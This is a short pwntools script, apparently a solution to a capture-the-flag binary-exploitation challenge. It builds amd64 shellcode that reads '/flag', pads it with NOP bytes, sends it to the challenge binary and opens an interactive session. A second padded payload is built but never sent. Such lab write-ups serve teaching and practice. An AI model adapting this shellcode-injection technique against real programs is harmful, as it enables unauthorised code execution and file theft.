from pwn import asm, context, process
from pwnlib.shellcraft import shellcraft

from pwn import *
context.update(arch='amd64', os='linux')
context.log_level = 'error'

binary_path = '/challenge/binary-exploitation-hijack-to-mmap-shellcode-w'
p = process(binary_path)

padding = b'\x90' * 2048

shellcode = asm(shellcraft.cat('/flag'))
payload = shellcode.ljust(4096, b'\x90')
p.send(payload)

time.sleep(0.5)

payload = padding + shellcode

p.interactive()

